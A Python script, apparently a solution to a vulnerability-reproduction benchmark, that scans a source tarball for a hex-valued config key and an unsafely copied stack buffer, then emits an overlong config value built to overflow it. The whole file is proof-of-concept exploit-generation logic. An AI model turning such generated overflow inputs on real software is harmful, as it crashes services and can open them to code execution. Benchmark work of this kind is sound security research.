import os
import re
import io
import tarfile
import tempfile
from typing import List, Tuple, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            self._safe_extract_tar(src_path, td)
            files = self._collect_files(td)

            sample = self._find_config_sample(files)
            key, sep, prefix, prelude_lines = None, None, None, []

            if sample is not None:
                key, sep, prefix, prelude_lines = sample

            if key is None or sep is None:
                inferred = self._infer_key_sep_prefix_from_source(files)
                if inferred is not None:
                    key, sep, prefix = inferred
                else:
                    key, sep, prefix = "hex", "=", ""

            if prefix is None:
                prefix = ""

            buf_size = self._infer_vuln_buffer_size(files)
            if buf_size is None:
                buf_size = 512

            # Keep token size reasonably small (avoid huge configs) but sufficient to overflow common stack buffers.
            # Ground truth is 547, likely around 512-byte buffer.
            token_len = max(buf_size + 16, 520 if buf_size < 520 else buf_size + 16)
            token_len = min(token_len, 900)

            # Ensure hex digits only (some parsers validate isxdigit); keep optional 0x prefix if inferred.
            digits_len = token_len - len(prefix)
            if digits_len < 32:
                digits_len = 32
            if digits_len % 2 == 1:
                digits_len += 1

            hex_digits = ("A" * digits_len)
            value = (prefix + hex_digits)

            line = f"{key}{sep}{value}\n"
            out = ""
            if prelude_lines:
                out += "".join(prelude_lines)
                if not out.endswith("\n"):
                    out += "\n"
            out += line
            return out.encode("utf-8", errors="ignore")

    def _safe_extract_tar(self, tar_path: str, out_dir: str) -> None:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = os.path.normpath(m.name)
                if name.startswith("..") or os.path.isabs(name):
                    continue
                dst = os.path.join(out_dir, name)
                parent = os.path.dirname(dst)
                if parent:
                    os.makedirs(parent, exist_ok=True)
                f = tf.extractfile(m)
                if f is None:
                    continue
                with open(dst, "wb") as w:
                    w.write(f.read())

    def _collect_files(self, root: str) -> List[str]:
        out = []
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                p = os.path.join(dirpath, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if st.st_size <= 0 or st.st_size > 4 * 1024 * 1024:
                    continue
                out.append(p)
        return out

    def _read_text(self, path: str) -> str:
        try:
            with open(path, "rb") as f:
                data = f.read()
        except OSError:
            return ""
        # Best-effort decoding
        try:
            return data.decode("utf-8", errors="ignore")
        except Exception:
            try:
                return data.decode("latin-1", errors="ignore")
            except Exception:
                return ""

    def _find_config_sample(self, files: List[str]) -> Optional[Tuple[str, str, str, List[str]]]:
        exts = {".conf", ".cfg", ".ini", ".cnf", ".config"}
        hex_re = re.compile(r"(0x[0-9A-Fa-f]{4,}|[0-9A-Fa-f]{16,})")
        # Prefer smaller sample files
        candidates = []
        for p in files:
            base = os.path.basename(p).lower()
            ext = os.path.splitext(base)[1]
            if ext not in exts and "conf" not in base and "config" not in base and "cfg" not in base:
                continue
            try:
                size = os.path.getsize(p)
            except OSError:
                continue
            if size > 200 * 1024:
                continue
            txt = self._read_text(p)
            if not txt:
                continue
            if not hex_re.search(txt):
                continue
            candidates.append((size, p, txt))
        candidates.sort(key=lambda x: x[0])
        for _, p, txt in candidates[:20]:
            lines = txt.splitlines(True)
            # Find first non-comment line containing a hex-looking value
            for i, line in enumerate(lines):
                stripped = line.strip()
                if not stripped or stripped.startswith(("#", ";", "//")):
                    continue
                if stripped.startswith("[") and stripped.endswith("]"):
                    continue
                if not hex_re.search(line):
                    continue

                # Parse formats:
                # 1) key = value / key:value
                m = re.match(r'^\s*([A-Za-z0-9_.-]+)\s*([=:])\s*(.+?)\s*(?:[#;].*)?$', line)
                if m:
                    key = m.group(1)
                    sep = m.group(2)
                    val = m.group(3).strip()
                    q = ""
                    if len(val) >= 2 and ((val[0] == val[-1] == '"') or (val[0] == val[-1] == "'")):
                        q = val[0]
                        val_core = val[1:-1]
                    else:
                        val_core = val

                    prefix = "0x" if val_core.lower().startswith("0x") else ""
                    # Prelude: include nearest preceding section header, if any.
                    prelude = []
                    j = i - 1
                    while j >= 0:
                        s = lines[j].strip()
                        if not s:
                            j -= 1
                            continue
                        if s.startswith("[") and s.endswith("]"):
                            prelude = [lines[j]]
                        break
                    # Preserve quoting if present (use prefix without quotes in generation, quoting can be re-applied if needed)
                    # Since quoting can interfere with parsing in some formats, omit quotes.
                    return key, sep, prefix, prelude

                # 2) whitespace-separated: key value
                parts = stripped.split()
                if len(parts) >= 2 and hex_re.fullmatch(parts[1]) is not None:
                    key = parts[0]
                    val = parts[1]
                    prefix = "0x" if val.lower().startswith("0x") else ""
                    prelude = []
                    j = i - 1
                    while j >= 0:
                        s = lines[j].strip()
                        if not s:
                            j -= 1
                            continue
                        if s.startswith("[") and s.endswith("]"):
                            prelude = [lines[j]]
                        break
                    return key, " ", prefix, prelude

        return None

    def _infer_key_sep_prefix_from_source(self, files: List[str]) -> Optional[Tuple[str, str, str]]:
        src_exts = {".c", ".h", ".cc", ".cpp", ".cxx", ".hpp"}
        strcmp_re = re.compile(r'\bstrn?cmp\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*,\s*"([^"]{1,64})"\s*(?:,|\))')
        config_get_re = re.compile(r'\b(?:config|cfg|conf|ini)\w*\s*\([^;]*"([A-Za-z0-9_.-]{1,64})"')
        sscanf_fmt_re = re.compile(r'\bsscanf\s*\([^;]*"([^"]+)"')
        key_scores = {}

        saw_0x = False
        saw_eq_cfg = False
        saw_space_cfg = False

        for p in files:
            ext = os.path.splitext(p)[1].lower()
            if ext not in src_exts:
                continue
            txt = self._read_text(p)
            if not txt:
                continue
            low = txt.lower()
            if "0x" in low:
                saw_0x = True
            plow = p.lower()
            cfg_ctx = ("config" in low) or ("cfg" in low) or ("conf" in low) or ("ini" in low) or ("config" in plow) or ("conf" in plow)
            if not cfg_ctx and ("hex" not in low):
                continue

            lines = txt.splitlines()
            for i, line in enumerate(lines):
                l = line.lower()
                if "sscanf" in l:
                    m = sscanf_fmt_re.search(line)
                    if m:
                        fmt = m.group(1)
                        if "=" in fmt or "%[^=]" in fmt:
                            saw_eq_cfg = True
                        if re.search(r'%s\s+%s', fmt):
                            saw_space_cfg = True

                for m in strcmp_re.finditer(line):
                    s = m.group(2)
                    if not re.fullmatch(r"[A-Za-z0-9_.-]+", s):
                        continue
                    score = 1
                    sl = s.lower()
                    if "hex" in sl:
                        score += 8
                    if "key" in sl:
                        score += 5
                    if "seed" in sl or "token" in sl or "id" in sl:
                        score += 2
                    near = "\n".join(lines[max(0, i - 8):min(len(lines), i + 9)]).lower()
                    if "hex" in near or "0x" in near or "isxdigit" in near:
                        score += 4
                    if cfg_ctx:
                        score += 2
                    key_scores[s] = max(key_scores.get(s, 0), score)

                if ("config" in l or "cfg" in l or "ini" in l) and '"' in line:
                    for m in re.finditer(r'"([A-Za-z0-9_.-]{1,64})"', line):
                        s = m.group(1)
                        if not re.fullmatch(r"[A-Za-z0-9_.-]+", s):
                            continue
                        score = 1
                        sl = s.lower()
                        if "hex" in sl:
                            score += 6
                        if "key" in sl:
                            score += 4
                        if "0x" in l or "hex" in l:
                            score += 2
                        if cfg_ctx:
                            score += 2
                        key_scores[s] = max(key_scores.get(s, 0), score)

            for m in config_get_re.finditer(txt):
                s = m.group(1)
                score = 2
                sl = s.lower()
                if "hex" in sl:
                    score += 6
                if "key" in sl:
                    score += 4
                key_scores[s] = max(key_scores.get(s, 0), score)

        if not key_scores:
            sep = "=" if (saw_eq_cfg or not saw_space_cfg) else " "
            prefix = "0x" if saw_0x else ""
            return "hex", sep, prefix

        best_key = max(key_scores.items(), key=lambda kv: kv[1])[0]
        sep = "=" if (saw_eq_cfg or not saw_space_cfg) else " "
        prefix = "0x" if saw_0x else ""
        return best_key, sep, prefix

    def _infer_vuln_buffer_size(self, files: List[str]) -> Optional[int]:
        src_exts = {".c", ".h", ".cc", ".cpp", ".cxx", ".hpp"}
        # Patterns for unsafe usage: func(dest, ...)
        func_patterns = [
            ("strcpy", re.compile(r"\bstrcpy\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*,")),
            ("strcat", re.compile(r"\bstrcat\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*,")),
            ("sprintf", re.compile(r"\bsprintf\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*,")),
            ("vsprintf", re.compile(r"\bvsprintf\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*,")),
            ("gets", re.compile(r"\bgets\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)")),
            ("sscanf", re.compile(r"\bsscanf\s*\([^;]*?\"[^\"]*%s[^\"]*\"\s*,\s*&?\s*([A-Za-z_][A-Za-z0-9_]*)")),
            ("fscanf", re.compile(r"\bfscanf\s*\([^;]*?\"[^\"]*%s[^\"]*\"\s*,\s*&?\s*([A-Za-z_][A-Za-z0-9_]*)")),
        ]
        decl_tpl = r"(?:^|[;{{}}\n])\s*(?:unsigned\s+)?char\s+{var}\s*\[\s*(\d+)\s*\]"
        # Candidates: (score, size)
        candidates: List[Tuple[int, int]] = []

        for p in files:
            ext = os.path.splitext(p)[1].lower()
            if ext not in src_exts:
                continue
            txt = self._read_text(p)
            if not txt:
                continue
            plow = p.lower()
            path_bonus = 2 if ("conf" in plow or "config" in plow or "cfg" in plow) else 0
            for func, pat in func_patterns:
                for m in pat.finditer(txt):
                    var = m.group(1)
                    pos = m.start()
                    window_start = max(0, pos - 12000)
                    window = txt[window_start:pos + 2000]
                    decl_re = re.compile(decl_tpl.format(var=re.escape(var)))
                    dm = None
                    for dm in decl_re.finditer(window):
                        pass
                    if dm is None:
                        continue
                    try:
                        size = int(dm.group(1))
                    except Exception:
                        continue
                    if size < 16 or size > 2048:
                        continue

                    near = txt[max(0, pos - 600):min(len(txt), pos + 600)].lower()
                    score = path_bonus
                    if func in ("strcpy", "strcat", "sprintf", "vsprintf", "gets"):
                        score += 6
                    else:
                        score += 4

                    vlow = var.lower()
                    if "hex" in vlow:
                        score += 10
                    if "key" in vlow:
                        score += 4
                    if "buf" in vlow or "tmp" in vlow or "val" in vlow or "value" in vlow:
                        score += 2

                    if "hex" in near or "0x" in near or "isxdigit" in near:
                        score += 6
                    if "config" in near or "cfg" in near or "conf" in near or "ini" in near:
                        score += 3

                    if 400 <= size <= 600:
                        score += 3
                    elif 200 <= size <= 399:
                        score += 2
                    elif 64 <= size <= 199:
                        score += 1

                    candidates.append((score, size))

        if not candidates:
            return None

        candidates.sort(key=lambda x: (x[0], -x[1]), reverse=True)
        best_score = candidates[0][0]
        top = [sz for sc, sz in candidates if sc >= best_score - 1]

        # Avoid being misled by very large line buffers; prefer <=1024 if possible
        top_filtered = [s for s in top if s <= 1024]
        if top_filtered:
            # Prefer sizes around 512 when available, else smallest to minimize payload
            around_512 = sorted(top_filtered, key=lambda s: (abs(s - 512), s))
            return around_512[0]
        return min(top) if top else candidates[0][1]